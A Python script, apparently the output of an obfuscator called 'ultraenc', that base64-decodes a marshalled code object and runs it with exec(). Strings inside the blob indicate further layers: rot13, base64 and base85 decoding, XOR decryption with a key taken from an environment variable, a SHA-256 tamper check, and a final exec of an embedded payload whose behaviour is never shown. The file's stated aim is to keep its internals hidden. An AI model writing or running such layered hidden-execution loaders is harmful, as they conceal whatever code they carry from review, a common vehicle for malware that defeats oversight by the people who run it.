#!/usr/bin/env python3
# ultraenc final wrapper â€” keeps internals hidden
import base64, marshal

DATA = """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DAEIAXIDAAAAYQAUAABuS1dQV3ljNnJhYnVWSDQvV3ZSYU0wMXVWRjA5QmxwdVZGRUNaUlJnV1JnVkNKOXRYUUlPWUZFWUZHMWluRjQyREYweEYwYjlvM1YzQjBSZ1l4U3VWR2ovSlFEOXBQOU5DRzFqQlJML0NLT09HUlI5cFJjRkRtMWpIMXVTQ0tPcEt4cDlwVEl4RkhSaFhsSWRDS09obnhrT1l3MGtvUTFrVmFBQ0RIeHZLUHlPWXhIaUl5V3pGYUlxRmx5aVlKQU9GSXBsSUlXekZVRGpESHhlTHZjR0ZSTVlFdzFrQ3dPSURIeUtaeUlGTXh1MFpIU1dYMlZkSDB1VEYwTVlYSjhnTXhTV0d2a3JGbHllcUlTT1lGQUlZbDRrcVRJU1ZGUnVWSjlUSkpiYXFGUmdJekV5RFFBT3FKOVNMejhqWEZnUUtIeDVFeEVmWEdMZUd2dGRMMEFsRUlBbEV4MTBFdmtRR0hPTFZ4RVBHeER6RDJ4ZG9GeVJXbUFSWHhBYkFsMWVFUU93RXZmK0JtdGxwR09mQm1FT1hKRCtXU3hrRTJPZm9sWjVZSmp5QVBaNE1tRVZaMXlQb3dSZ0FteVdFUU93RXZmK0IwUjRwd1ZpSHl1eFpUSTBHMFJsWElnUEhHQU9DeHFtRElFUm9Ha1RLMU93QUhOOEFLQWVEd0UxV1VTUW54aitCSHB5WVE4ZVkyMWNvbVovSG1JcENROUdBSWo4QzFaMU0ydTZydlJ1VkZSeVZGUnVWR2J1VkZSdU1QUnVWRlYvQkhIK1gyNVZHUTVlSVJaenBKeVVERjBnQkhFT1lHOVNGUlJnSElTWkRGMXdLSU9PWUtJY0lSUmhaYUlMREY1U1lTa09ZeXA0TFJSaG5IRXhERjh6SFR1T1ltdXBvUlJpR1RxRERGOUhMS09GTXh1MEIxQVZFSEFPR3dqOUhtT09ZMjltcVJaYVd5T01FSkFFQWx1VEJIdGVwUkw1SGwwMkRHTmZNM0FGTXh5YUJJV3pGVUVOSDB1cW9RU1lYSmcxSEhFWllUdDVGVHlvcDJPVG8xY0hDUlJqRlEweERscHpIU3lTbkZjaktSTDVGUGcxRXd5R1lHTU9aU2JrVjFXekZKcDVIek1WcVJPR0ZTMWZaSGZjbjNJRUVSTUdLeDFUQkh0ZXFITDVNR3g0REdPd0FsTUZNeHlhQklXekZVRU5IMHVxb1FTWVhKZzFISFJqb1NIYUh6TVZxUnFHRlJMNURITDVXS1ozREdSY0ZGY0ZNeHUwRkhMNlgwZjdER1I3b0YxRk14YzFMU0V0RWw5aUNVV3hZUTh2QkdrQkVSWmJWeld2R214YUlhVnVDUk9CR0ZSOERSTGZFd3gvSUpNT1pRSWdwMVd6RlVFWUV3eXBabXFWbklFS0JJQVZJVExqRmx5ZXFJU1RCeE1mSEhSa0dtNUdWR2tOWjFPVm5JQXhWdlI4Q21SeENJRVJxUUVXWlFFalYwRU5aVDVHRkdOMHBQWmpFR2t4WVJSZm8wOGhZd0V5QUc4MFhVV3NKUkhnVnZNaFpRTXNJelJpb3o4bUVITVFESnB6RFFnRklsa1JNdkhoQkhPa1pScHZFUmdZcElTVURUVjFueE9sTGwxYkV4QXlNek1RWkdWL0MwTjhDMUh6RVA5dUgwMVZBVFdORXhwNm9JRVdFdmJibkZxU0xKT3pCME9sRlFBelZJMUtXek5oWjExZ1pSRXpNUGN6QVBFZ3AzV1JGSlNrSEhwdVl2RGpabTlhVktaZlZ2RHhMSEV6V21abEVQcVJXelYwSlB5SUFtT3hCSkRtWjBTS0hIOGpNeThqR1FTVUtsRVZaSlozQjB4dURIY2FXUUg3QXdxWlpsTGZWbEVOQUhFUUh4UjNNeFpoRlFNVkt3eVNZUXgxcUhOOENtRHlFUkRnQUpFVUR5ajJLMFNpRVM0ZlkxRWZYSDFPSDNIdXB4UjNLR2MwVnZXVXB5VjlwR0VNWW15WnBtdVdFRnlaQTJJVEtsa0tCRzFqQzExT1psTDhHeVNWQ3YwY29SdCtZd1ZtRFFFbUZ6YmpGUzl3RW1PeW4yUjBCSU9YRHpJVUlTODFud1dXREhOdVl3QVpvM1NTWVF4Y01IU0ZLUWdWRXc0d0dQMGxLMHVnRUZmOUYya0ZDUHh4V0dmZUVUV3ZZSFNZSlJnR0RVVnhWR1plRFJXYUswRXpXbEw5WlRJdkNHcGpGd0hrRHdWY1lJNC9aUnV1QmxNT29KOXJvbU5pSkg5U1kyeGZEMnRlRVNSMEJIWm1ad2J6WlRJZkZTZmxNdnlER0hOM1oxWmtBMXB1RUZiNVlsdUtLbXA0Q3piL0VscUxEd2Y1SFJjUE1IcUhwSHFDRHlTR0NtdVRWMmdtWUhxUEtRTXREemo0VkdNTkJhQUluUkRiS0cwNkVRT3dIbVdOQjFFRllIRXpJU1JjRHpqM1hJcU5weHVRWTJwYVhGTGNFRjBnREg4akFGa1ZHUkhnVnZNaFpRTXNJelJpb3o4bUVITVFESnB6RFFnRklsa1JNdkhoQkhPa1pScHZFUmdZcElTT0gyZ2RuSEFjTEdqYUVSZ0hveDlWQVRTeUJIV2ZFMUlVREdxcURUdU5DUThhWmxnUUtIUjdXSUw1R3dONEhVUnhHSEVTRVR4eFpSYjFER1poSXZTQ0MwU2lwS1pmRElBbUpIcVZDdkh6QlFTeVpRdUhCeHFMcEhwOVZsVmZHbXFMQTB4L0UzU2JweHFVcVJBVVZ3QVJuYVdZWFFPSW5HQVJNeTR3RlBJSlcwSWpFeEF6Q21aaUgyOHVCSFYyQTJwMVdQRGpKekxpSGFXVkUwTXJLSVpiRTFMZEkwVmlIek9JQmw5R0gyU09XSXQ1SHc1UFl5ajlHMHA2TVFrTkRRZmpIbHh6QkhFUm9GOUZweHVVRXk1bm5tMVJNVDFTcDBTSUFUODBZMUFIWHhFVEQwU2FXeE43SHlEY0RtUmxEUUh4cVJMbW94TVFNdzhtWTFFd0JTcU9ISkw2RlJPa1pQdWJFeEx2R1JaaUlTT1NEeE1zWVNwNURJV2dEd2NQb1Q0eEFsRHhLUEhrRXZ0aUp3QVBubVdBcDBNdEl2ajNZMVd0QnZxUkYwamtBUnFKWHhJVkVKVjVFR0FRR1VTUVpQTWpXSU1pWTFXbEZScVRLeWNlRFJBYW5SSTBFVE1IS3hmd1d6SUJweFYxWEdwaldJcXdaemZpSG11RkJIT2tKMHQ0RHprZ3BRRHlJMlpsbmw5R0JTVjVEVVNvRlFXUk1GY1RYdklLTG1XZVkxWjRId3lOcElnVlhIU0hHS1dtVjBXVER6TU9JUkVOV3h0MEcwTWlEVVNQSXZEaUhsOWFaUkV5WHlWdkR3TWVYVUFOcEdOYm5STDluUWo3RVJiZVh2QVBBU3gyR3hPbEZRYnhEemY3SVJXT0gyZ2RuSEF3cUdaNEQwMXhwbGtUWEZBd1owQUJFdzgyRVJnUEtSUmtMek9FSnhON1pSOGtEVVdWWm1XVExTTGZBMEVXRkhXaEFUU1hDdldPb3paNllSTVFZMjlpRVA1RG55cVJNeFd6WHhXZkJQRGxDMWJqTTI0L0p5MXJwR0VzREZqOUV2dVZNUEg5cFJjc0hSTjZJM1NjRXdFakx2MU5DUTVrWFA1bW5IeUtESUVBcFBFUEFTcDRGdmp5THhBMERHcU9xU3FRR1FmZG94SVZIVUg1RElXZnFHeGZXbDVyWjBEYUVQQXNFSkFlcEhJVlowcVNwRjVqSlF5UldINWhaeWo3RmxBVUlHa1ZEMUVaWG05UUpIUnVDMkFwWFBqeUpKSDRFVE1Ib3habUphV3ZveE10SXZqM0VSeVdEejRmVkZ0d25QanlFMU55REhnZFkxdGZXME9tQ1JJd1lRanpESVdQWXowL0p5MXJvUlNHcHkwOFZJZnpJdjRhWHZMdkFQZ05aVHVySnZaMEVLQW5ZUjQ5SlJNdEl2ajNYbTlRSTJmeG9HdGNJUkw4RXlaY0RJRU9veVplRUk0NUl2UnVWRzlCV1JnTkgxV2NNejh3SHlPc1dKdU1Gek43bzBNY016OHdIeU9zV0p1TUZ6TjdvME1jTXo4d0h5T3NXSnVNRnpON28wTWNNejh3SHlPc1dKdXVJeWdSRXlTSUxUTjhaR3lBRFRPV0JSOVZXemoxcVBWNU1KeWFxS0ViRXl5Qm5hVnVWdjVzSUlNbEVLU2ZuSk1pVjFXREtsSWJKSGN0QjI5VG5KTWlWMVdES2xJYkpIY3RCMjlUbkpNaVYxV0RLbEliSkhjdEIyOVRuSk1pVjFXR0N5SW5ISFdFSG04NEV2QWVwbDFOQjI5akFITVFNd3h2RHdMeUVLRGlvMU93RG1OMEZ6Y09GUUhpWElBT0gzSHhISFNIR0tOeER3RUxCbWdQRzFSdW5IV2VaUlNFVmFEdkVscVVLSWJjbmwxQkV2a1ZYME41R0lFSEFHcWtIeE1BcVJMZkJRcC9JSGdUWnl4OUFsZ1Baejl6RUpTdHFHVjJxUmozRkhFWENIVjNFSTFEQ2wwdklTQUJXdjRrbm1WOUVKVmpBd0lPSVIxbUFtMWpZMklzRXZiZ1htMVREMk1xQ0pwYVhIcDVEemo0V0h0dUVJZzBJRzRrcGxTbk1sTUxKM1p1RDFPRUVITVJuM1ZlRVNMK1lsZ09FUDVQV0hxb25tamJFeEQxSndXVFdteGZISFNIQjJiYkV2YmFuS1NOcEhXSldSV2ZEVDVRVnhJcEMzT09LMHg4WTBBYkFtT21NbHBsQlA5VFh2dWNWRjRqSG04Z0V6T0pZUXFhV3prWENSQWFXVU9GRVRIaEhGTU9Kd0luR0Z4d3AxdDZwRzl6Q2wxUW5KY3FYMFNHcUZTT0VJeUdISVp1VnlEelpQUmdCYVo2VkZSdVZGVnVJMk9ZWVBTS0xROGFWSXF0Q2xwdUkyTi9XbFNLTFE4YVZJcXRDbHB1STJOL1dsU0tMUThhVklxdENscHVJMk4vV2xTS0xROGFWSXF0REpMdkIydVpZbFdsTVQxQVhteDhZMXBlQkhJR0x2U0tuSHR6VjFTMUEwNGFFSGZqSGxEbUN2OXJWRlJ1VnY4dUNRamRWYWM2VktXbENQRHZvMjVLV21NQkRQeXhFd1NzRnlSdVl3RXdJbFNVSzJTS1p4eWZvUzR1WUhSMkl2U3hWeDVIVnZ1SkcyOHVuVE1MRGxTV0cyOU1WeXAzQjA0d1cwZzFNRjVLRTJONVZ4TVpBdkx1Q1JIa0NsQXFDd01PVkZnbkNIMHVMMnVnTFBTYktIODRWSHFKSjF0dlhTTUxGRlJpWkh5ZlZGZ25aSFZ2RlFrWEl2U1dKVUlkVnhNWkF2THVDUkhrQ21IekdtdVVWRmduRFI0dUwyYjhabFNiS0g4NFZIcUpKMXR2WFNNckZsV1ZDUmNKVkh5THFKYnZFeGoyV3ZSOEVHUi9FUmNhcEg4dVgxYmtGRlN3bjJJcVdST0FxVER1blMxQ0JQU1VJeWd0VkpWN0lIYnZGUWtYSXZTV0pVSWRWeE1aQXZMdUNSSGtDMVdJTDBBbVZGSU9CeDVlb1JBdkxGUjRBMHA3Vnd4NEVGSGhaUXRnVzBBQkJITUlWRlJ5Q1J0aW9KMWNFRlJ1VkZBdFZLV2xDUEVTSlB5RkVGUmRJR2NwRTBPdk13Y1ZXUGNiQ3hIZVh6TTFESjVETVRrUUdJajhESE9tWncwdUVQdGZKSFZ2RVNNZG5SRUpDd2Y0RFFncUlKOVJCbFoxWEhXRVdJRWpESUVFSEY5UG9RdHVBeE44WHZ1c1ZGUnZFMDFhV21XWEEwTVJBSWJsRUl5cEkxRHVCUXFubzBTSElsRGRFSkFuQW0wdVZGUnZDdnh3cDF0NkVJYmVvMXR1QlFxSVZITGJGMFYxQVF4ZkMxMVNxSmY3S0ZSdVZGRGRWSXl2SkhEdUNSNDVaRlI5WTJPVlZHMUdxR3B1SkpXTUVQUjlZMTBpVkl5dkp5SGdHeExmRlJNSU1IV0NWRkVZQVRSMm9GanZDU3lNb1NMYUgzSWRZU3R6WUZ5cFpGZ1BadjBqQW10OXAzU3RabWpmS3p5YlZHcWpFeWtzcUdmdVdScG1HMTlmV0ZxdERJQUtFUWJqTXpxVEF2Z1JDd1Z4RElBd1dtWmVDeU8xVm1TdVdSeC9FUnlnSTNIZUd2dUxBeFNHTFQ0L1pIdVZKUXhlRVE0bFdSU0dMbHBhSzIxTG9QTVFMdjFwTG1BbnBRYnpEeDlEcFQ1UW5TeDlEVHliVkdxall3VnhKRmp1VkZSdkN2Z2luU0VRRUl5T0VJUnVZRjlSRlBSdVdGRVhWRlJ1Vnc0eVpQMU9ZeElMR0pjV1ZGMGlIUmp1VkZIeEdGUnVWRlYrWVNTV014SWFXemd3VnhBY0lHTWRWRlJ5V1RIdVZGUndIRldzblRjaEV6T3NKUXh1VkZSdkN2TGdYSWprTWxNZld2a1RFRjluWUZSdVdGRUtWRlJ1Vnc0Y1YzQUxCeEluVnp5S1ZGMGlxU3R1VkZ1ckpHRVJNdldXRXk5ZUl5UnVDUWpkVnhMdVhScXNWRlNjSVFWdUNGOXRBUFNMV3g0ZlZHa3RFRmZ1Q1RPU1hsUjhMUnRqWTB4bVhQdHVDd0lSRmxTdkdteHVEUWNSWnlMa0x5NUxvbVNBWW1rbVpKdVpCU0xtV3ZSeEVHWmVBVFJkRFRqL0JsRGxYSVZoVndPQ3FLU1padnh4cDBwa1pIOWNHSE4xcFBBR0RKeUpJdnVOSEdMelZtV3RJMUhiREpaPdoFcGxhaW7aACkBcicAAAApFloJY3lfbG9hZGVycgIAAAByAwAAANoJRXhjZXB0aW9ucgwAAAByBQAAAHITAAAAcjQAAAByCgAAAHIQAAAAchIAAAByFgAAANoDc3RyciEAAAByHAAAAHImAAAAWgdQQVlMT0FEWgRNT0RFWghTQUxUX0hFWFoHS0VZX0VOVtoEY29kZdoEZXhlY3IIAAAAcggAAAByCAAAAHIJAAAA2gg8bW9kdWxlPgMAAABzIgAAAAIBFAEMASYCCAMIAwgDCAMSAxIHGAwOCAQBBAEEAQQCEgE="""

try:
    blob = base64.b64decode(DATA)
    code = marshal.loads(blob)
    exec(code)
except Exception as e:
    print("Hata:", e)
